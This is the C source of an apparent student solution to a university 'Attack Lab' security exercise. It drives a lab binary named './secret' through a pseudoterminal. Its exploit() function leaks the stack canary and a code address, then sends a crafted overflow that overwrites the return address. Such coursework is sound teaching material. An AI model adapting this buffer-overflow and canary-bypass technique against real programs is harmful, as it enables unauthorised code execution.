/* 
 * PKU-ICS: Attack Lab X
 * 
 * <Please put your name and userid here>
 * 
 * handin.c - Source file with your solutions to the Lab.
 *            This is the file you will hand in to your instructor.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/wait.h>

static int exploit(FILE *rfile, FILE *wfile)
{
  // Here is a demo on how to interact with the program:
  unsigned char wbuf[1000]={0};
  unsigned char rbuf[1000]={0};

  fgets(rbuf, 1000, rfile);
  printf("1The target string is: %s", rbuf);

  for(int i=0;i<248;i++)
    wbuf[i]='0';
  fwrite(wbuf,248,1,wfile);
  fflush(wfile);

  fgets(rbuf, 1000, rfile);
  printf("2The target string is: %s", rbuf);
  fgets(rbuf, 1000, rfile);
  printf("3The target string is: %s", rbuf);
  unsigned char can[8];
  can[0]=0;
  for(int i=0;i<7;i++)
  {
    printf("i:%d can:%.2x\n",i,rbuf[i]);
    can[i+1]=rbuf[i];
  }
  fwrite("-1\n",3,1,wfile);
  fflush(wfile);

  fgets(rbuf, 1000, rfile);
  printf("4The target string is: %s", rbuf);
  fgets(rbuf, 1000, rfile);
  printf("5The target string is: %s", rbuf);

  for(int i=0;i<264;i++)
    wbuf[i]='0';
  wbuf[263]='\n';
  fwrite(wbuf,264,1,wfile);
  fflush(wfile);

  fgets(rbuf, 1000, rfile);
  printf("6The target string is: %s", rbuf);
  fgets(rbuf, 1000, rfile);
  printf("7The target string is: %s", rbuf);
  memset(rbuf,0,sizeof(rbuf));
  fgets(rbuf, 1000, rfile);
  printf("8The target string is: %s", rbuf);

  unsigned char ad[8];
  unsigned long long addr=0;
  for(int i=7;i>=0;i--)
  {
    if(rbuf[i]=='\n')
      rbuf[i]=0;
    addr=(addr<<8)+rbuf[i];
    printf("i:%d ad:%.2x\n",i,rbuf[i]);
  }
  printf("addr:%llx\n",addr);
  addr+=0x1229;
  addr-=0x1494;
  printf("addr:%llx\n",addr);
  for(int i=0;i<8;i++)
  {
    ad[i]=addr&0xff;
    addr>>=8;
    printf("i:%d ad:%.2x\n",i,ad[i]);
  }

  fgets(rbuf, 1000, rfile);
  printf("9The target string is: %s", rbuf);
  for(int i=0;i<248;i++)
    wbuf[i]='0';
  for(int i=248;i<248+8;i++)
    wbuf[i]=can[i-248];
  for(int i=256;i<264;i++)
    wbuf[i]='0';
  for(int i=264;i<264+8;i++)
    wbuf[i]=ad[i-264];
  wbuf[272]='\n';
  fwrite(wbuf,274,1,wfile);
  fflush(wfile);

  fgets(rbuf, 1000, rfile);
  printf("10The target string is: %s", rbuf);
  fgets(rbuf, 1000, rfile);
  printf("11The target string is: %s", rbuf);
  // sleep(5);
  fgets(rbuf, 1000, rfile);
  printf("12The target string is: %s", rbuf);

  return 0;
}

static pid_t spawn(const char *program, FILE **rfile, FILE **wfile)
{
  int rpipes[2]; // (parent rfile, child stdout)
  int wpipes[2]; // (child stdin, parent wfile)
  pid_t pid;
  char slavept[20];

  // Pseudoterminal is used to force the output line-buffered
  rpipes[1] = posix_openpt(O_RDWR | O_NOCTTY);
  if (rpipes[1] < 0) {
    perror("posix_openpt");
    return -1;
  }

  if (grantpt(rpipes[1]) < 0) {
    perror("grantpt");
    goto rpipe_err;
  }

  if (unlockpt(rpipes[1]) < 0) {
    perror("unlockpt");
    goto rpipe_err;
  }

  if (ptsname_r(rpipes[1], slavept, sizeof(slavept)) < 0) {
    perror("ptsname_r");
    goto rpipe_err;
  }

  rpipes[0] = open(slavept, O_RDWR | O_NOCTTY);
  if (rpipes[0] < 0) {
    perror("open");
    goto rpipe_err;
  }

  if (pipe(wpipes) < 0) {
    perror("pipe");
    goto wpipe_err;
  }

  pid = fork();
  if (pid < 0) {
    perror("fork");
    goto fork_err;
  } else if (pid == 0) {
    // Execute `./secret` in the child process
    close(rpipes[0]);
    close(wpipes[1]);
    if (dup2(rpipes[1], 1) < 0) {
      perror("dup2");
      exit(-1);
    }
    if (dup2(wpipes[0], 0) < 0) {
      perror("dup2");
      exit(-1);
    }
    close(rpipes[1]);
    close(wpipes[0]);

    execlp("sh", "sh", "-c", program, NULL);
    perror("execlp");
    exit(-1);
  }

  // parent use rpipes[0] as input
  //            wpipes[1] as output
  close(rpipes[1]);
  close(wpipes[0]);
  *rfile = fdopen(rpipes[0], "r");
  *wfile = fdopen(wpipes[1], "w");
  return pid;

fork_err:
  close(wpipes[0]);
  close(wpipes[1]);
wpipe_err:
  close(rpipes[0]);
rpipe_err:
  close(rpipes[1]);
  return -1;
}

struct piped_fps
{
  FILE *in_fp;
  FILE *out_fp;
};

static void *pipe_fp(void *priv)
{
  struct piped_fps fps = *(struct piped_fps *)priv;
  size_t nbuf;
  ssize_t nbytes;
  char *buffer = NULL;

  for (;;)
  {
    nbuf = 0;
    if ((nbytes = getline(&buffer, &nbuf, fps.in_fp)) < 0)
      break;

    nbytes = fwrite(buffer, 1, nbytes, fps.out_fp);
    if (nbytes == 0)
      break;
    fflush(fps.out_fp);

    free(buffer);
    buffer = NULL;
  }

  if (buffer)
    free(buffer);
  fclose(fps.in_fp);
  fclose(fps.out_fp);
  return NULL;
}

static void forward(FILE *rfile, FILE *wfile)
{
  struct piped_fps fps1 = {
    .in_fp = stdin,
    .out_fp = wfile,
  };
  struct piped_fps fps2 = {
    .in_fp = rfile,
    .out_fp = stdout,
  };
  pthread_t th1, th2;

  pthread_create(&th1, NULL, &pipe_fp, &fps1);
  pthread_create(&th2, NULL, &pipe_fp, &fps2);

  pthread_join(th1, NULL);
  pthread_join(th2, NULL);
}

int main(void)
{
  FILE *rfile, *wfile;
  pid_t pid;

  pid = spawn("./secret", &rfile, &wfile);
  if (pid < 0)
    return -1;
  fprintf(stderr, "spawn pid=%d\n", pid);

  fprintf(stderr, "Press <Enter> to continue...\n");
  getchar();

  if (exploit(rfile, wfile) < 0) {
    fputs("exploit failed\n", stderr);
    kill(pid, SIGINT);
  } else {
    fputs("exploit ok\n", stderr);
    forward(rfile, wfile);
  }

  if (waitpid(pid, NULL, 0) != pid)
    perror("waitpid");

  return 0;
}
